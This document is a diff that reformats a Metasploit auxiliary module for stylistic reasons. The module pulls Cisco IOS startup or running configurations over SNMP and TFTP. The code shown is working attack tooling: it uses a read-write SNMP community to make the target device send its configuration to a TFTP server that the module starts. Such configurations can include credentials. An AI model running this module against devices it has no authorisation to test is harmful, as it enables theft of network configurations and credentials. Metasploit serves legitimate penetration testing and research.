@@ -1,13 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SNMPClient
   include Msf::Auxiliary::Cisco
   include Msf::Auxiliary::Scanner
@@ -15,14 +14,14 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'        => 'Cisco IOS SNMP Configuration Grabber (TFTP)',
-      'Description' => %q{
+      'Description' => %q(
           This module will download the startup or running configuration
         from a Cisco IOS device using SNMP and TFTP. A read-write SNMP
         community is required. The SNMP community scanner module can
         assist in identifying a read-write community. The target must
         be able to connect back to the Metasploit system and the use of
         NAT will cause the TFTP transfer to fail.
-      },
+      ),
       'Author'      =>
         [
           'pello <fropert[at]packetfault.org>', 'hdm'
@@ -30,12 +29,11 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE
     )
     register_options([
-      OptEnum.new("SOURCE", [true, "Grab the startup (3) or running (4) configuration", "4", ["3","4"]]),
-      OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files (disabled by default)"]),
-      OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ])
-    ], self.class)
+                       OptEnum.new("SOURCE", [true, "Grab the startup (3) or running (4) configuration", "4", ["3", "4"]]),
+                       OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files (disabled by default)"]),
+                       OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ])
+                     ], self.class)
   end
-
 
   #
   # Start the TFTP Server
@@ -43,8 +41,8 @@ class MetasploitModule < Msf::Auxiliary
   def setup
     # Setup is called only once
     print_status("Starting TFTP server...")
-    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
-    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
+    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', 'Msf' => framework, 'MsfExploit' => self)
+    @tftp.incoming_file_hook = proc { |info| process_incoming(info) }
     @tftp.start
     add_socket(@tftp.sock)
 
@@ -65,7 +63,11 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status("Shutting down the TFTP service...")
       if @tftp
-        @tftp.close rescue nil
+        begin
+          @tftp.close
+        rescue
+          nil
+        end
         @tftp = nil
       end
     end
@@ -75,11 +77,11 @@ class MetasploitModule < Msf::Auxiliary
   # Callback for incoming files
   #
   def process_incoming(info)
-    return if not info[:file]
+    return unless info[:file]
     name = info[:file][:name]
     data = info[:file][:data]
     from = info[:from]
-    return if not (name and data)
+    return unless name && data
 
     # Trim off IPv6 mapped IPv4 if necessary
     from = from[0].dup
@@ -103,7 +105,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     begin
       source   = datastore['SOURCE'].to_i
       protocol = 1
@@ -121,14 +122,13 @@ class MetasploitModule < Msf::Auxiliary
 
       snmp = connect_snmp
 
-
-      varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}" , SNMP::Integer.new(protocol))
+      varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}", SNMP::Integer.new(protocol))
       value = snmp.set(varbind)
 
       # If the above line didn't throw an error, the host is alive and the community is valid
       print_status("Trying to acquire configuration from #{ip}...")
 
-      varbind = SNMP::VarBind.new("#{cccopysourcefiletype}#{session}" , SNMP::Integer.new(source))
+      varbind = SNMP::VarBind.new("#{cccopysourcefiletype}#{session}", SNMP::Integer.new(source))
       value = snmp.set(varbind)
 
       varbind = SNMP::VarBind.new("#{cccopydestfiletype}#{session}", SNMP::Integer.new(1))
@@ -149,12 +149,11 @@ class MetasploitModule < Msf::Auxiliary
     # No need to make noise about timeouts
     rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception => e
       print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
     ensure
       disconnect_snmp
     end
   end
-
 end
